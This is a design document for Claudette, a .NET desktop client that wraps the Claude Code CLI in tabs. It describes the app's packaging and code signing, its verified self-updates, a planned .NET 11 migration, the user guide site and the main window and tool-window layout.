# Claudette Design

Claudette is a .NET desktop client that wraps [Claude Code](https://code.claude.com/docs) in a friendly, native-feeling interface. It runs several Claude Code sessions side by side in tabs and makes it obvious how fast you are using up your plan's limits.

Claudette does not replace Claude Code. It runs the real `claude` CLI as a child process for each tab, and draws the conversation with native controls instead of a terminal.

## 1. Goals

- **Nicer than a terminal.** Show messages, tool calls, diffs and permission prompts as real UI, using each platform's native look and window behavior.
- **Many sessions at once.** Each tab is an independent Claude Code session with its own working folder.
- **Token burn awareness.** Always show how much of the current session, weekly and model-specific limits you've used, how fast you're using them, and when you'll run out at the current rate.
- **Easy to stop.** It should always be one click (or one key) to stop what Claude is doing in the current tab.
- **Pick up where you left off.** Tabs come back when Claudette restarts, and a session library in a synced folder lets another machine continue the sessions you choose to sync.

### Non-goals (v1)

- Calling the Claude API directly. All model work goes through Claude Code.
- Being an IDE. Claudette has an editor for reading and touching up a project's files beside the conversation ([§18](#project-files)), but no language services, building, debugging or source control: those stay in the user's own tools.
- Replacing Claude Code's configuration. Claudette reads and respects `~/.claude` settings, `CLAUDE.md`, MCP servers and hooks, but doesn't try to manage them.
- Linux polish. It builds and runs on Linux, and CI tests every change there as on Windows and macOS (the RealCli tests run only there), but only Windows and macOS are packaged.

## 2. Platform & Tech Stack

| Area | Choice | Notes |
|---|---|---|
| Runtime | .NET 10 (LTS) | Moving to .NET 11 is planned ([below](#moving-to-net-11)). |
| UI | Avalonia 12 | One codebase for Windows, macOS and Linux. |
| Look & feel | Fluent theme on Windows, macOS-style theme on macOS | Follows the OS light/dark setting, in JetBrains Rider's Islands look or the Claude apps' ([Visual style](#visual-style)), with an opaque frame (no Mica backdrop, since 2026-10-28). The header is the window's title bar on Windows and macOS, as in Rider, with the OS's title bar on Linux or by choice ([Window frame](#window-frame)); traffic lights and the menu bar on macOS. The macOS-style theme isn't built yet; macOS uses the Fluent theme for now. |
| Pattern | MVVM with CommunityToolkit.Mvvm | |
| Markdown | LiveMarkdown.Avalonia | For assistant messages. Built for streaming: text is appended as it arrives instead of re-rendering the whole message. Includes syntax-highlighted code blocks. (Markdown.Avalonia only had an alpha for Avalonia 12.) |
| Diffs | Claudette's own line diff and diff view, highlighted with TextMateSharp | The TextMate grammars and themes LiveMarkdown already ships for code blocks. AvaloniaEdit was the plan, but a read-only diff doesn't need an editor. |
| Code editor | AvaloniaEdit, with AvaloniaEdit.TextMate | The Project Files tab's editor ([§18](#project-files)). It highlights with the same TextMate grammars and themes as the diff view. |
| Usage history | SQLite (Microsoft.Data.Sqlite) | [§6](#usage-history) |
| Dependency | Claude Code CLI | Not bundled: Claudette runs the user's own. It finds `claude` on `PATH` (on macOS and Linux, the login shell's `PATH`, [§13](#login-shell-environment)), in the usual install folders or at a path set in Settings, checks its version on launch against a minimum supported version, and shows a setup screen if it is missing or too old. When it's missing, the setup screen can install it with Claude Code's own installer, and says when the Claude desktop app, which isn't Claude Code, is installed ([§12](#installing-claude-code)). Sign-in is handled inside Claudette (see [§11](#11-sign-in)). |
| Service status | Claude's public status page, status.claude.com | Read for the header's status dot and the incident banner: its Statuspage summary, with no sign-in. Settings → General turns it off. [§18](#service-status). |
| Packaging | Windows: MSIX. macOS: signed, notarized `.app` in a `.dmg`. | [Below](#packaging-and-signing). |
| User Guide | Jekyll with Just the Docs, on GitHub Pages | https://claudette.dotbunny.com, built from `docs/` and `CHANGELOG.md` on `main` by a workflow. Planned ([below](#user-guide)). |

### Packaging and signing

The files are in `packaging/`, and `.github/workflows/package.yml` builds them.

- **Windows: MSIX**, one per architecture (x64, arm64), self-contained.
  - `packaging/windows/build-msix.ps1` publishes the app, adds `Package.appxmanifest` and the tile images, builds `resources.pri` for the scaled taskbar icons, and packs with `makeappx`. Given a `.pfx`, it signs with `signtool`, for a local test.
  - **Signing.** The workflow signs the GitHub package with **Azure Artifact Signing** (`azure/artifact-signing-action`): the `dotbunny` account's `dotBunny` certificate profile, a Public Trust profile, at `https://eus.codesigning.azure.net/`, timestamped by `http://timestamp.acs.microsoft.com`. It signs in to Azure with `azure/login` and GitHub's OIDC token, as an Entra app registration with no secret: its federated credential trusts only this repository's `release` environment, and it holds the Artifact Signing Certificate Profile Signer role. The manifest's `Publisher` is the profile's subject, `CN=dotBunny, O=dotBunny, L=Peterborough, S=Ontario, C=CA`, which every later release must keep: it's part of the package's identity, so a package under another publisher couldn't update an installed one ([Updating Claudette](#updating-claudette)). The workflow then checks Windows finds the signature valid.
  - The identity is `dotBunny.Claudette`, the same as the AppUserModelID an unpackaged Claudette uses. The manifest's `Publisher` must match the signing certificate's subject; the script takes it as `-Publisher` or `MSIX_PUBLISHER`. `PublisherDisplayName` is `dotBunny`, the publisher's name in the Microsoft Store. The assemblies name dotBunny as their author, and dotBunny Inc. as their company and copyright holder, as the license does (`Directory.Build.props`).
  - The tile images go into the `Assets` folder the app's publish already has. The script fails if an image the manifest names isn't in the package, which the Store refuses.
  - **The Microsoft Store's package.** With `-StorePublisher` (`MSIX_STORE_PUBLISHER`), the script packs the same layout a second time, into `artifacts/store/`, with the publisher Partner Center gives Claudette (Product identity: `CN=F363E167-1FAD-4382-A179-29A2D849A02A`). It's left unsigned, since the Store signs what it delivers. Everything else is the same in both, the identity name `dotBunny.Claudette` and `PublisherDisplayName` included. The workflow keeps them as `store-windows-<arch>` artifacts to upload to Partner Center, and leaves them out of the release.
  - A startup task (`windows.startupTask`, `ClaudetteAtLogin`, off until Settings turns it on) starts Claudette at login ([§9](#starting-at-login)).
  - **File and registry write virtualization are off** (`desktop6:FileSystemWriteVirtualization`, with the `unvirtualizedResources` capability). Claude Code and every tool it runs are Claudette's children and share its package container. Otherwise their writes under AppData and HKCU would go to Claudette's private copy, where a terminal `claude` wouldn't see them.
  - Windows only installs signed packages. For a local test, sign with a self-signed certificate whose subject matches the publisher, and trust it.
- **macOS: a `.dmg` per architecture** (arm64, x64) holding `Claudette.app` and an Applications link.
  - `packaging/macos/build-dmg.sh` publishes into the bundle, writes `Info.plist` and the icon, signs every file in `Contents/MacOS` and then the bundle with the hardened runtime, builds the `.dmg`, signs it, notarizes it with `notarytool`, staples the ticket and checks Gatekeeper accepts the `.dmg`. If Apple turns the `.dmg` down, it prints Apple's log of why.
  - **Signing.** With a Developer ID Application certificate. .NET keeps its assemblies beside the executable in `Contents/MacOS`, where `codesign` counts every file as code and refuses a bundle with an unsigned one, so the script signs each file there, not only the Mach-O ones; a file that isn't Mach-O keeps its signature in extended attributes, which the `.dmg` and `ditto` keep. The entitlements go on the executable alone. The workflow imports the certificate's `.p12` into a keychain of its own and signs with the one Developer ID Application identity in it, so the team is whatever the certificate's is. Every later release must keep that team: a signed Claudette refuses an update another team signed ([Updating Claudette](#updating-claudette)).
  - The bundle identifier is `com.dotbunny.claudette`; User Notifications need one ([§10](#10-notifications)). The entitlements allow only what .NET's JIT needs.
  - `Info.plist` has purpose strings for the Documents, Desktop, Downloads, removable and network volume prompts. Claude Code runs as Claudette's child, so macOS asks about Claudette when Claude Code reads a project in one of those places.
- **The workflow.**
  - A `v*` tag builds signed packages and attaches them to a draft GitHub release once the tests pass too (`ci.yml`, called as a reusable workflow). **Run workflow** builds them for a given version.
  - **Release notes.** The draft's notes are the version's section of `CHANGELOG.md`, which `packaging/release-notes.sh` prints; a pre-release without a section of its own takes **Unreleased**'s ([GUIDE.md](GUIDE.md#the-changelog), "Releasing"). A tag whose version has no notes fails in the first job, before anything is built, and a pull request that changes the workflow reads the latest release's notes, to check the script. Claudette's update dialog shows them ([Updating Claudette](#updating-claudette)).
  - A pull request that changes `packaging/` builds them unsigned, to check the scripts.
  - Signing and notarization use secrets, listed at the top of the workflow, kept in a `release` environment whose protection rules should allow only `v*` tags; pull requests use no environment and build unsigned. Without them a tag's or **Run workflow**'s build fails rather than leave a package unsigned: Windows needs the Azure secrets, and macOS the certificate and an App Store Connect API key to notarize with.
  - The version is checked to look like one (`1.2.3`, `1.2.3-beta.1`) and reaches the scripts through the environment, never pasted into them, since **Run workflow** takes it as free text. Every action is pinned to a commit, with its version in a comment; Dependabot proposes updates ([§15](#tools-and-ci)).
  - Symbols (`.pdb`) are kept out of the packages, as artifacts of their own, to read crash reports' stack traces with.
- **The icon** is Claudette: Clawd, Claude Code's pixel mascot, with hair on top, a berry hair tie and a ponytail. `packaging/icon/build-icons.mjs` draws every file from one 12×12 sprite, with a whole number of pixels per cell so the small sizes stay crisp. To change the icon, change the sprite and run the script (`node packaging/icon/build-icons.mjs`).
  - **Windows:** `src/Claudette.App/Assets/claudette.ico` and `packaging/windows/Assets/`, with no background. Its taskbar sizes include 24, 36 and 48 px (100%, 150% and 200% scaling), where the sprite fills the icon.
  - **macOS:** `packaging/icon/claudette-1024.png`, on an ivory tile.
  - **SVG:** `packaging/icon/claudette.svg`. The script also writes it to `.idea/.idea.Claudette/.idea/icon.svg`, where Rider looks for a project icon.
  - **Animation frames** ([§10](#10-notifications)): `src/Claudette.App/Assets/AppIcon/`, embedded in the app. The taskbar overlay's spark and hourglass, and Claudette typing, waving and waiting by an hourglass on the Dock icon, drawn at half the macOS icon's size so the Dock icon doesn't shift when an animation starts.
  - **Claudette on the composer** ([§5](#claudette-on-the-composer)): `src/Claudette.App/Assets/Mascot/mascot.json`, her poses, props and hats as rows of cells, which the app draws itself.

> **Not yet tested on a real machine:** drafting a release with its notes from `CHANGELOG.md`, which needs a tag; installing and running the MSIX and the `.dmg`, and signing and notarization, which need the certificates. The pull request build checks that both packages build.

### Updating Claudette

An installed Claudette checks its GitHub releases for a newer version, downloads it, installs it and restarts into it, with every tab as it was: the same handover a source build uses for a new build ([§9](#working-on-claudette)).

- **Checking.**
  - At launch and every 6 hours, Claudette asks the GitHub REST API for `dotBunny/Claudette`'s releases. It doesn't sign in, and the check sends nothing but the request.
  - 0.1.0 came from `reapazor/Claudette`, before the repository moved: it asks for that repository's releases, and its packages were `reapazor.Claudette` and `com.reapazor.claudette`. GitHub redirects the request and the HTTP client follows it, so 0.1.0 still announces new releases, with a link to their page; no repository may be created at `reapazor/Claudette` (a fork there included) while those copies are in use. It refuses the new packages, which have another identity, so they're installed by hand; on Windows the MSIX installs beside 0.1.0's.
  - It offers the newest release above the running version. Tags are versions such as `v1.3.0` or `v1.4.0-beta.1`, ordered as Semantic Versioning orders them.
  - Pre-releases count only with **Include pre-releases**. Drafts aren't visible without signing in to GitHub, so a release is offered once it's published: the package workflow's draft release becomes an update when it's published.
  - **Check for Claudette updates automatically** turns this off. Both settings are in Settings → General, which also shows the version, when it last checked and **Check now**. The version is also at the foot of the Settings sidebar ([§14](#version)).
  - A source build doesn't check releases. It checks the branch its checkout tracks for new commits instead, and pulls and builds them ([§9](#working-on-claudette), "New commits upstream").
  - A copy from the Microsoft Store doesn't check either: the Store updates it, and a release's package, with another publisher, couldn't replace it. Windows says which package came from the Store (`Package.Current`'s `SignatureKind`), and Settings → General says *This copy is from the Microsoft Store, which keeps it up to date.*, without **Check for Claudette updates automatically**, **Include pre-releases** or **Check now**. A bug report's version says *(Microsoft Store)*.
- **Which package.** The release asset named for this install, as `package.yml` names them:
  - `Claudette-<version>-<x64|arm64>.msix` for an MSIX install.
  - `Claudette-<version>-<arm64|x64>.dmg` for `Claudette.app`.
  - Anything else, such as a Linux build or an unpackaged Windows one, can't replace itself. The release is still announced, with a link to its page.
- **Offering it.** A badge at the foot of the sidebar, like Claude Code's ([§12](#applying-it)): *"Claudette 1.3.0 is available"*. Its dialog shows:
  - the release notes and a link to the release page;
  - **Download and restart**, which becomes **Restart to update** once the package is downloaded;
  - **Update when idle**, while a tab is working, which waits until no tab is starting, working or waiting on the user;
  - **Download**, to fetch it now and install later;
  - **Skip this version**, which hides the badge until a newer release (saved with this machine's state).

  Settings → General has the same actions.
- **Downloading.**
  - The package goes to `updates/<version>/` in the data folder, under a temporary name.
  - It's kept only once its size and the SHA-256 digest GitHub publishes for it match. A package that doesn't match is deleted. A package GitHub publishes no digest for isn't downloaded at all: the dialog says so and links to the release page.
  - A package already downloaded isn't fetched again. Downloads of the running version and older ones are deleted at launch.
- **Checking the package** before anything closes. If the package fails a check, nothing else happens.
  - **MSIX:** its manifest must be `dotBunny.Claudette`, from the same publisher as the installed package (compared as the package family name, so a package signed by someone else would install beside this one instead of replacing it). It must also be the release's version and this machine's architecture. Windows checks the signature when it installs.
  - **macOS:** the image is mounted, and its `Claudette.app` copied next to the running one, as `.Claudette-update.app` in the same folder. The copy must have:
    - a valid signature (`codesign --verify --deep --strict`). When the running app is signed with a Developer ID, the copy must also meet the code requirement `anchor apple generic and certificate leaf[subject.OU] = "<its team>"`: a certificate Apple issued to the same team, which an ad-hoc signature or another developer's doesn't. When the running app's own signature can't be read (`codesign` failed or timed out), nothing is installed, rather than the check being skipped;
    - the bundle identifier `com.dotbunny.claudette`;
    - the release's version.
- **The handover**, as for a new build ([§9](#working-on-claudette)):
  1. Claudette writes the restart snapshot (every tab, draft, the selected tab and the window's placement) with the versions it's updating from and to.
  2. It saves its state and stops writing it, stops every tab as closing does, and stops taking later launches.
  3. **Windows:** it calls `RegisterApplicationRestart` with `--restore <nonce>`, then `PackageManager.AddPackageAsync` with `ForceApplicationShutdown`, as Microsoft documents for apps published outside the Store. Windows closes Claudette, installs the update and starts the new version with those arguments. If the install finishes without closing Claudette, Claudette starts the new version itself (`IApplicationActivationManager`) and waits up to 60 seconds for it to say it's up.
  4. **macOS:** Claudette starts a small helper script and quits. Once Claudette has quit, the helper:
     - renames the running app to `Claudette.app.previous` and the new one to `Claudette.app`;
     - starts it with `--restore <nonce>`;
     - waits up to 60 seconds for it to write the nonce to `restart-ready`.
  5. The new version opens the snapshot's tabs, writes the nonce once its first page has drawn, and only then deletes the snapshot.
- **If it goes wrong.**
  - **Before Claudette closes** (the check fails, Windows refuses the package, the helper can't start): the tabs come straight back and the dialog says why.
    - If the package is fine but couldn't be installed this way, **Open the installer** (App Installer on Windows) or **Open the disk image** installs it by hand.
    - macOS runs an app opened from Downloads from a temporary, read-only copy (app translocation), and that copy can't be updated. The dialog asks to move Claudette to Applications, or to install by hand.
  - **The new version doesn't start** (macOS): the helper stops it, puts the old app back and starts that with the same `--restore`. The old app takes the tabs back from the snapshot, which is still there, and says the update didn't finish.
  - **Windows doesn't start the new version:** the snapshot waits a day. The next launch within that time takes the tabs from it, even without `--restore`, and says whether the update installed.
- **MSIX versions** have four parts and no pre-release label (`1.4.0-beta.1` packages as `1.4.0.0`), so a pre-release and its final release have the same package version. Windows won't reinstall the same version, so give the final release a higher version than its pre-releases' packages.

> **Not yet tested on a real machine:** installing an update on Windows and macOS, which needs signed packages from a published release. The steps before and after are covered by tests: finding and downloading the release against a fake GitHub, checking the packages, the handover and taking the tabs back. On Linux the macOS helper script is run for real, both swapping the apps and going back.

### Moving to .NET 11

Planned, not started. Tried on a branch on 2026-10-11 against .NET 11 RC1 (SDK `11.0.100-rc.1.26425.128`).

- **Why.** On macOS, .NET 10 starts processes with `fork()`, and .NET 11 with `posix_spawn` ([dotnet/runtime#126063](https://github.com/dotnet/runtime/pull/126063)). After a `fork()`, macOS's malloc can print *"MallocStackLogging: can't turn off malloc stack logging because it was not enabled."* from the child, under Claudette's name, before the child starts its program. It goes to Claudette's own stderr, so a source build started from a terminal (`dotnet run`, [§9](#working-on-claudette)) prints a line after the shell's prompt for each `git`, `claude` or `p4` it starts. `posix_spawn` runs no fork handlers, and starts processes faster. An installed Claudette has no terminal, so only source builds show it.
- **When.** At .NET 11's release on 2026-11-10, not from a release candidate. If [dotnet/runtime#131944](https://github.com/dotnet/runtime/issues/131944) (below) is still open then, with the first servicing release that fixes it. .NET 11 is supported until 2028-11-09 and .NET 10 (LTS) until 2028-11-14, so the move gains no support time; .NET 12, the next LTS, is due in November 2027.
- **To decide first: macOS 14.** .NET 11 needs macOS 14 or later ([dotnet/runtime#123200](https://github.com/dotnet/runtime/pull/123200) raised its deployment target from 12.0). Moving drops macOS 12 and 13, which `LSMinimumSystemVersion` in `packaging/macos/Info.plist` (12.0) still allows.
- **What changes.**
  - `Directory.Build.props` targets `net11.0`, and `global.json` names the new SDK. A prerelease SDK has to be named in full: `setup-dotnet` installs exactly that version, and `11.0.100` with `latestFeature` doesn't accept a release candidate.
  - `Microsoft.Extensions.Logging.Abstractions` goes from Core, Usage, Platform and `Directory.Packages.props`. .NET 11 has it in the shared framework, and the reference fails restore with NU1510 under warnings as errors. This was the build's only error.
  - Every `packages.lock.json` changes; restore and commit them.
  - `LSMinimumSystemVersion` becomes 14.0.
  - What names .NET 10: the table above and §10's Windows toasts (`net10.0`), CLAUDE.md (the stack, the SDK pin, Platform's "plain `net10.0`"), the README, the comment in `.claude/hooks/session-start.sh`, and the `bin\Debug\net10.0` paths in `tools/Claudette.Demo/screenshots.ps1`.
  - `Microsoft.Data.Sqlite` stays on 10.0.x, which runs on .NET 11. Its 11.0 packages move to SQLitePCLRaw 3, which packages the native library differently (`SourceGear.sqlite3`): a change of its own, checked against the `.dmg`'s signing.
- **Checked on Windows** (RC1): the build has no warnings at `AnalysisLevel=latest` with C# 15. Every test that runs on Windows passes, as on .NET 10 (`Category!=Live`, the RealCli tests included). The self-contained publish works for win-x64, win-arm64, osx-x64 and osx-arm64, about 6 MB larger. The published app starts, opens a tab running `claude`, and closes with its processes ended.
- **Afterwards,** as changes of their own: `ProcessStartInfo.InheritedHandles` would keep one tab's processes from inheriting another's pipes, and `StartDetached` suits restarting into a new build and the macOS update helper.

> **Still to verify,** on macOS and Linux, where nothing has run on .NET 11 yet:
> - The `MallocStackLogging` lines gone from a source build started from a terminal on macOS.
> - Closing tabs and quitting on macOS arm64. `Process.Kill(entireProcessTree: true)`, which `ProcessLauncher` uses to end each tab's `claude`, can hang there on .NET 11 ([dotnet/runtime#131944](https://github.com/dotnet/runtime/issues/131944), open and marked a regression). A fix for hangs caused by stopped child processes ([dotnet/runtime#135409](https://github.com/dotnet/runtime/pull/135409)) is due in the release.
> - Quitting on macOS without a crash report. .NET 11 aborts when native code calls into .NET after `exit()` has begun. Avalonia's case is fixed in 12.1.3 ([AvaloniaUI/Avalonia#22200](https://github.com/AvaloniaUI/Avalonia/pull/22200)); Claudette's own Objective-C callbacks (notifications, the Dock icon) haven't been tried.
> - CI on macOS and Linux, where the process-tree, Keychain, `caffeinate`, login shell, single-instance and `update-helper.sh` tests run. .NET 11 creates the single-instance pipe's socket with mode 0600.
> - A signed, notarized `.dmg` and a signed MSIX from `package.yml`.
> - Timers across sleep on Windows. .NET 11's timers there count only time awake, as they already do on macOS and Linux ([the breaking change](https://learn.microsoft.com/dotnet/core/compatibility/core-libraries/11/environment-tickcount-windows-behavior)). The check-in and auto-continue monitors read the clock every 10 and 30 seconds, so they're unaffected; a usage poll can come up to 5 minutes after waking instead of at once.

### User Guide

✅ Built 2026-10-16. A website at https://claudette.dotbunny.com that shows people how to use every part of Claudette, with pictures: what each part is for, how to do things with it, the settings that change it and its shortcuts. The README stays the repository's front page, and links to the guide. [GUIDE.md](GUIDE.md) is its plan: how the site is built, how a page is written and its pictures taken, and which page describes each part of Claudette.

- **Where it lives.** In `docs/` on `main`, which GitHub Pages publishes at the domain. So the guide changes in the same pull request as the feature it describes, and is reviewed with it, as this document is. A GitHub wiki was the other choice. It's a repository of its own, edited without pull requests, so it would fall behind the app; and search engines index only the wikis of repositories with 500 stars or more.
- **How it's built.** By GitHub Pages itself, from `docs/` on `main`, with Jekyll and the [Just the Docs](https://just-the-docs.com) theme, so nothing of ours has to run to publish it. A workflow of ours that built and published the site was the first plan, so that a Changelog page could be made from `CHANGELOG.md` at the repository's root and the Downloads page rebuilt whenever a release is published; GitHub Pages' own build reads only `docs/`, runs only its own plugins and only on a push. That wasn't worth keeping a workflow for: the changelog is a link, and the Downloads page catches up with the push that follows each release. A workflow, `docs.yml`, only checks each pull request's pages for broken links and pictures. MkDocs Material was the other choice of builder, for nothing the guide needs.
- **Downloads and the changelog.** A Downloads page lists every release with its packages, the latest first. The sidebar's **Changelog** links to `CHANGELOG.md` on GitHub, which says what changed in each version for the people using Claudette, in the [Keep a Changelog](https://keepachangelog.com/en/1.1.0/) format, with versions following Semantic Versioning. A change people would notice adds its entry in the same change; a release's notes are its section ([Packaging and signing](#packaging-and-signing)), so the release on GitHub and the update dialog ([Updating Claudette](#updating-claudette)) say the same.
- **Trademarks.** The site's footers name the trademarks it uses, each with its owner's notice, as Settings → About does ([About](#about)). The landing page's engine cards, and its project tools' cards under them, have their icons on the card itself, without the tiles the page's other cards have, since the makers' logos can't sit on one: Unreal Engine's is Epic's icon in its black or white, Godot's its icon in its colors on a light page and all white on a dark one, and Unity's a cube in the headings' color until Unity lets Claudette show its logo; Perforce's card has Perforce's symbol, 40 pixels wide with clear space of half its height around it, as its brand guidelines say, and its title beside it, as the editor logs' and the pipeline's cards have theirs ([About](#about)). The guide's Unreal Engine, Godot and Perforce pages have their makers' logos for their titles.
- **Keeping it current.** A change people can see updates its guide page in the same change as this document, once its chapter is written ([GUIDE.md](GUIDE.md#7-keeping-it-current)).
- **Claudette links to it** as **User Guide**, which opens the guide's first page in the browser: first in the header's menu ([§3](#3-main-window)), at the foot of Settings' sidebar, above **Ask on Discord** and **Report an issue** ([Version](#version)), in the command palette's **Help** ([Command palette](#command-palette)), and in the macOS **Help** menu ([Opening a tab](#opening-a-tab)).
- **dotBunny's Discord** is at `/discord/` on the site, a page that only forwards to the server's invite, so Claudette, the site, the README and GitHub's New issue page link there rather than to the invite. An invite can expire or be replaced, and a link in an installed Claudette can't change without a release; this way only `docs/discord.md` changes.
- **To decide later**, since it's what the user sees: whether Claudette links to the guide in other places too, through `F1` or a link from each Settings page to its chapter; and whether the update dialog links to the version's section of the Changelog page, beside the release on GitHub.

## 3. Main Window

```
┌────────────────────────────────────────────────────────────────────────────┐
│ ● ● ●  Claudette                                                           │
│ ┌ Session ███████████░░░░░░░ 62%  resets 2h 14m ┐  Weekly ███░░░ 38%       │
│ └ ╱╱╱ at this rate: limit hit in 1h 05m !       ┘  Fable  █░░░░░ 12%       │
├──────────────────┬─────────────────────────────────────┬───────────────────┤
│ + New tab      « │                                     │ Changed files     │
│ ▾ ● api        + │  You: refactor the auth middleware… │ M src/auth.cs +12 │
│ │ ● refactor au… │                                     │ A src/token +40   │
│ │   Opus · High  │  Claude: I'll start by reading…     │                   │
│ │ ! fix login b… │   ┌ Read  src/auth.cs ────────────┐ │                   │
│ │   Needs input  │   └───────────────────────────────┘ │                   │
│ ▸ ● docs  !    + │   ┌ Edit  src/auth.cs (+12 −3) ───┐ │                   │
│                  │   └───────────────────────────────┘ │                   │
│                  │   ┌ Allow Bash: dotnet test? ─────┐ │                   │
│                  │   │ [Allow] [Always allow] [Deny] │ │                   │
│                  │   └───────────────────────────────┘ │                   │
├──────────────────┼─────────────────────────────────────┴───────────────────┤
│ History          │ ~/src/api  Opus ▾  High ▾  Default ▾  Ctx 41%  1.2M tok │
│ 2.1.290 is ready │ ┌──────────────────────────────────────────┐            │
│ Settings         │ │ Message Claude…                          │ [ ■ Stop ] │
│                  │ └──────────────────────────────────────────┘            │
│                  │ Suffixes ▾  [Clarify first ×]                           │
└──────────────────┴─────────────────────────────────────────────────────────┘
```

1. **Usage header**, across the top. Always visible. Session usage is the most prominent item; weekly limits are smaller. A chevron at its right draws it taller, with charts ([Detailed header](#detailed-header)). See [§6](#6-token-burn-awareness). At its right, before the account name, the CPU and memory of every tab's processes while the process monitor is on ([§4](#process-monitor)), then a cup that turns **Keep this computer awake** on and off and steams while the computer is kept awake ([§9](#keeping-the-computer-awake)), then a dot that shows Claude's service status; while Claude has an incident a banner runs across the top under it ([§18](#service-status)). At its left, Claudette's logo, while the header is the title bar, and **≡**, the menu, in two sections under small muted titles, a line between them from edge to edge and an icon before each entry: **Help**, with **User Guide** (a book), **Ask on Discord** (a speech bubble) and **Report an issue** (a bug), as in **Help** at the foot of Settings' sidebar ([Version](#version)); and **Claudette**, with **About Claudette** (an i). Last at its right, after the account and plan, **Settings**, its icon, opens Settings ([§14](#14-settings)). Both are as big as the strip's icons; under the system's title bar, Settings sits over them. The header is the window's title bar, with the window's buttons after Settings ([Window frame](#window-frame)). While usage credits pay for Claude, a notice runs straight under the header, above any banner ([Usage credits](#usage-credits)).
2. **Sidebar**, on the left. One row per tab (one tab per session), with a status icon, grouped by working folder, and under a tab's row, the runs of its project actions ([§18](#project-tools)). **New tab** and **History** are at its top, over a line; each group's row has its project's icon, with its actions and links ([§18](#project-tools)), before **Project files**; the Claude Code and Claudette update badges are at its foot, under a line, which shows only while one of them does. It collapses to a rail of status icons. See [§4](#sidebar).
3. **Conversation.** The selected tab's conversation, or up to three tabs' side by side ([§18](#split-panes)). See [§5](#5-conversation-view).
4. **Tool windows**, at the window's right and along its bottom, outside the panes: **Changed files**, **Agents**, **Project**, **Processes**, **Tasks**, **MCP**, **Scratch pad** and **Games**, which were the side panel's pages, and **Find**, the searches kept from **Find in files**. A strip of icons at the window's right shows and hides them, as Rider's does. See [Tool windows](#tool-windows).
   - **Scrolling and wrapping.** Every session window's page scrolls up and down and wraps its text at the width shown, clear of the scroll bar, so nothing on it is cut off or sits under the bar: a changed file's name and path, a process's name, tasks and the plan, MCP servers' details and errors, an agent's prompt and result. A row's numbers and status line up at its right edge, as far in from it as the scroll bar is wide. Code blocks in a plan, prompt or result scroll sideways on their own, and so does a tree's row nested so deep (a process or an agent) that it would get less than 120 pixels. Three labels stay on one line, ending in "…", with the whole of them on hover: an agent's title and summary in the tree, which its details under the tree show whole, the tool call that started a process, which every process it started repeats, and a process's arguments, after its running time. How it's built: the pages' scroll viewers don't scroll sideways, so their text gets the width shown. The two trees' do, and `Controls/ShownWidth` keeps each row to the width shown from where it starts, less the 16 pixels of Fluent's scroll bar, which it draws over the content.
5. **Composer.** Where you type to the selected tab, plus the Stop button and per-tab controls. With tabs side by side, each pane has its own.

Right-click menus open where the pointer is, as wide as their longest entry. How it's built: `Controls/ContextMenuPlacement` anchors each one at the pointer instead of using Avalonia's pointer placement, because Avalonia 12.1 keeps a pointer-placed menu's window at the size of the menu's first layout. That first layout is too narrow: the entries' columns for ticks, icons and submenu arrows only widen after it, so a tab's menu cut off **Connect to the Claude app**.

Claudette's menu on the composer ([§5](#claudette-on-the-composer)) is drawn in Claudette's window instead of a window of its own, and moves to stay inside it. How it's built: `MascotLayer` styles her figure's menu popup with `ShouldUseOverlayLayer`. A menu's own window is sized in whole screen pixels and only follows the menu after its first layout, so it can come out shorter than the menu. Fluent's menu then shows scroll arrows at its top and bottom whenever its items and the room for them differ at all, and the arrows take that room. Under her, the window kept only the arrows, and her menu looked empty.

### Tool windows

✅ Built 2026-10-28, in place of the side panel, which each tab had of its own on its right; made Rider's the same day. The side panel's pages are tool windows now, as JetBrains Rider has them: one layout for the whole window, outside the panes, with a strip of icons at the window's right.

```
┌──────────┬──────────────────────────────────────┬─ Changed files ── ⋮ − ┬──┐
│ sidebar  │ conversation                         │ 2 files changed        │▣ │ top group
│          │                                      │  M auth.cs      +3 -1  │◈ │
│          │                                      ├─ Scratch pad ──── ⋮ − ┤──│ divider
│          │                                      │ notes…                 │✎ │ split group
│          ├─ Find  'speed' ×  'Health' × ── ⋮ − ─┤                        │  │
│          │ Player.cpp  2                        │                        │⌕ │ bottom group
└──────────┴──────────────────────────────────────┴────────────────────────┴──┘
```

- **The windows.** **Changed files** ([§8](#8-file-changes--diff-view)), **Agents** ([§18](#agent-map)), **Project** ([§18](#project-tools)), **Tasks** ([§5](#tasks)) and **MCP** ([§4](#mcp-servers)) at the right side's top; **Scratch pad** ([§18](#scratch-pad)), **Processes** ([§4](#process-monitor)) and **Games** ([§18](#games-with-claudette)) splitting it, under them; and **Find**, the searches kept from Find in files ([§18](#project-files), "Finding in files"), at the bottom. A window that has nothing to show has no icon: Project without project tools, Processes while the process monitor is off, Tasks before Claude keeps a list, MCP without servers, Games without a game, Find without a search kept.
- **What they show.** The focused tab's: its changed files, its agents, its tasks. With a Project Files tab or a log focused, they show the data of its group's session tab focused last, and the window's header names it, with its group's color, as it does while tabs are side by side, when the session shown may not be the one the user is looking at. Games is the app's, the same whichever tab is focused; Find is its searches'. A tab's data is read again as its window comes on screen: its changed files, its MCP servers, its scratch pad; and the composer's process summary hides while the Processes window shows the tab's processes.
- **The strip**, 40 pixels wide at the window's right, on the frame: an icon for each window, in three groups, as Rider's stripes have them. The right side's **top** group; a line; the group that **splits** the right side with it; and at the strip's foot, the **bottom** group. An icon's tip is the window's title, then what it holds now (*Tasks · To-do · 2 of 5 done*), and a dot on it says its work is running (a subagent, a project's job) or needs looking at (an MCP server).
- **Showing and hiding.** One window of each group shows at a time, beside the strip, taking room from the conversation. A click on an icon shows its window, in place of its group's other, and puts the keyboard in it (not while Claudette leaves the focus alone, [§9](#working-on-claudette): a focused control would bring the window forward); on the icon of the window showing, it hides it. The icon of a window showing is filled in with the accent. With windows of both the top and the split group showing, they share the right side's height, half each at first; the line between them drags, and a double-click halves it again.
- **The right side** is the whole height, at least 260 pixels wide (340 by default), its inner edge dragging to widen it and a double-click going back; **the bottom** is under the panes, at least 120 tall (240 by default), the same way. The panes keep at least 360 pixels wide and 200 tall. The edges are the gaps between the islands, which light up under the pointer as the sidebar's edge does, and a window Dock Unpinned sizes the same way: a press on its edge doesn't count as a click elsewhere.
- **A window's header**, a row of 36 pixels over a line across the window, as the sidebar's top row is: its title (Find's has a tab for each search, which closes with its ×; Games' has the game open, with a menu of the others), the session it shows when it may not be the focused one, **⋮** and **−**. **−** hides it. **⋮**, and a right-click on its icon, open its menu: **View mode** (**Dock Pinned**, **Dock Unpinned**), **Move to** (**Right top**, **Right bottom**, **Bottom**) and **Hide**. A window has no tab row: its icon is how to it.
